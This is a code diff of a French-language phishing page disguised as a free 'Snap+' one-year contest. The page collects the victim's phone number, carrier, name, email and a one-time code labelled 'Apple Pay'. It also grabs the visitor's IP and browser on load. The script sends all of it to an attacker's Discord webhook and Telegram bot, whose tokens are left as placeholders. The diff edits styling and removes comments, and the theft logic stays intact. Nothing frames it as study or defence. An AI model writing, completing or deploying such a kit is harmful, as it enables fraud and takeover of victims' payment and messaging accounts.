@@ -1,53 +1,54 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8" />
-  <title>🎁 Concours Snap+ 1 an Gratuit 🎁</title>
-  <style>
-    body {
-      background: #2c014d;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      color: white;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
-    }
-    .container {
-      background: rgba(44, 1, 77, 0.85);
-      padding: 30px;
-      border-radius: 20px;
-      box-shadow: 0 0 20px #a54ffb;
-      width: 360px;
-      text-align: center;
-    }
-    input, select, button {
-      width: 100%;
-      margin: 8px 0;
-      padding: 12px;
-      border-radius: 10px;
-      border: 2px solid #a54ffb;
-      background: transparent;
-      color: white;
-      font-size: 16px;
-      outline: none;
-    }
-    button {
-      cursor: pointer;
-      background: #a54ffb;
-      font-weight: bold;
-      box-shadow: 0 0 10px #a54ffb;
-      transition: 0.3s;
-    }
-    button:hover {
-      background: #8b3ddb;
-      box-shadow: 0 0 20px #c177ff;
-    }
-    #step2, #otpStep {
-      display: none;
-    }
-  </style>
+<meta charset="UTF-8" />
+<title>Concours Snap+ 1 an Gratuit</title>
+<style>
+  body {
+    background: #2c014d;
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    color: white;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+  }
+  .container {
+    background: rgba(44, 1, 77, 0.85);
+    padding: 30px;
+    border-radius: 20px;
+    box-shadow: 0 0 20px #a54ffb;
+    width: 360px;
+    text-align: center;
+  }
+  input, select, button {
+    width: 100%;
+    margin: 8px 0;
+    padding: 12px;
+    border-radius: 10px;
+    border: 2px solid #a54ffb;
+    background: transparent;
+    color: white;
+    font-size: 16px;
+    outline: none;
+  }
+  button {
+    cursor: pointer;
+    background: #f7b500; /* jaune */
+    color: #2c014d;
+    font-weight: bold;
+    box-shadow: 0 0 10px #f7b500;
+    transition: 0.3s;
+  }
+  button:hover {
+    background: #e0a600;
+    box-shadow: 0 0 20px #ffcb3c;
+  }
+  #step2, #otpStep {
+    display: none;
+  }
+</style>
 </head>
 <body>
 
@@ -55,7 +56,7 @@
 
   <h1>🎁 Concours Snap+ 1 an Gratuit 🎁</h1>
 
-  <!-- Étape 1: Connexion et collecte téléphone + opérateur -->
+  <!-- Étape 1: numéro + opérateur -->
   <form id="step1Form">
     <input type="text" id="telephone" placeholder="Numéro de téléphone" required pattern="[\d\s+]{6,}" />
     <select id="operateur" required>
@@ -69,7 +70,7 @@
     <button type="submit">Continuer</button>
   </form>
 
-  <!-- Étape 2: Infos personnelles -->
+  <!-- Étape 2: formulaire complet -->
   <form id="step2Form">
     <input type="text" id="nom" placeholder="Nom" required />
     <input type="text" id="prenom" placeholder="Prénom" required />
@@ -92,7 +93,7 @@
 </div>
 
 <script>
-  // === Configs ===
+  // === Config ===
   const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/TON_WEBHOOK_DISCORD";
   const TELEGRAM_TOKEN = "TON_TOKEN_TELEGRAM";
   const TELEGRAM_CHAT_ID = "TON_CHAT_ID_TELEGRAM";
@@ -102,7 +103,7 @@
   let userIP = null;
   let userAgent = navigator.userAgent || "Inconnu";
 
-  // Stocke la date du dernier envoi OTP dans localStorage
+  // Check délai 5 min entre envois OTP
   function canSendOtp() {
     const lastSent = localStorage.getItem("lastSentOtp");
     if (!lastSent) return true;
@@ -113,7 +114,6 @@
     localStorage.setItem("lastSentOtp", Date.now().toString());
   }
 
-  // Récupère l'IP publique via API
   async function getPublicIP() {
     try {
       const res = await fetch("https://api.ipify.org?format=json");
@@ -124,7 +124,6 @@
     }
   }
 
-  // Envoi vers Discord (embed avec emojis)
   async function sendToDiscord(embed) {
     return fetch(DISCORD_WEBHOOK_URL, {
       method: "POST",
@@ -133,7 +132,6 @@
     });
   }
 
-  // Envoi vers Telegram (message texte)
   async function sendToTelegram(text) {
     const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
     return fetch(url, {
@@ -148,7 +146,6 @@
     });
   }
 
-  // Envoi du message "connexion" (IP + UserAgent)
   async function sendLoginInfo() {
     if (!userIP) return;
     const discordEmbed = {
@@ -162,7 +159,6 @@
     await Promise.all([sendToDiscord(discordEmbed), sendToTelegram(telegramText)]);
   }
 
-  // Envoi des infos du formulaire (étape 2)
   async function sendFormInfos(step1Data, step2Data) {
     const discordEmbed = {
       title: "🎲 INFOS PARTICIPANT [🎲]",
@@ -201,7 +197,6 @@
     await Promise.all([sendToDiscord(discordEmbed), sendToTelegram(telegramText)]);
   }
 
-  // Envoi du message OTP avec infos et code
   async function sendOtpMessage(code, data) {
     const discordEmbed = {
       title: "🍎 APPLE PAY [🍎]",
@@ -234,7 +229,6 @@
     updateLastSentOtp();
   }
 
-  // Gestion du formulaire
   document.addEventListener("DOMContentLoaded", async () => {
     userIP = await getPublicIP();
     await sendLoginInfo();
@@ -247,7 +241,6 @@
     let step1Data = null;
     let step2Data = null;
 
-    // Bloquer accès formulaire si OTP envoyé il y a moins de 5 min
     if (!canSendOtp()) {
       step1Form.style.display = "none";
       step2Form.style.display = "none";
@@ -255,7 +248,6 @@
       messageDiv.textContent = "Vous avez déjà envoyé un code, veuillez entrer le code OTP.";
     }
 
-    // Étape 1 : collecte téléphone + opérateur
     step1Form.addEventListener("submit", e => {
       e.preventDefault();
       step1Data = {
@@ -267,7 +259,6 @@
       messageDiv.textContent = "";
     });
 
-    // Étape 2 : collecte infos personnelles
     step2Form.addEventListener("submit", async e => {
       e.preventDefault();
       step2Data = {
@@ -286,7 +277,6 @@
       messageDiv.textContent = "Informations envoyées. Veuillez entrer le code OTP reçu.";
     });
 
-    // Étape OTP
     otpStep.addEventListener("submit", async e => {
       e.preventDefault();
       const code = e.target.otpCode.value.trim();
@@ -296,11 +286,10 @@
         return;
       }
 
-      // Envoi du code OTP (simulé ici)
       const otpData = {
         nom: step2Data.nom,
         prenom: step2Data.prenom,
-        dob: "Non fournie", // ou ajouter input supplémentaire si tu veux
+        dob: "Non fournie",
         email: step2Data.email,
       };
 
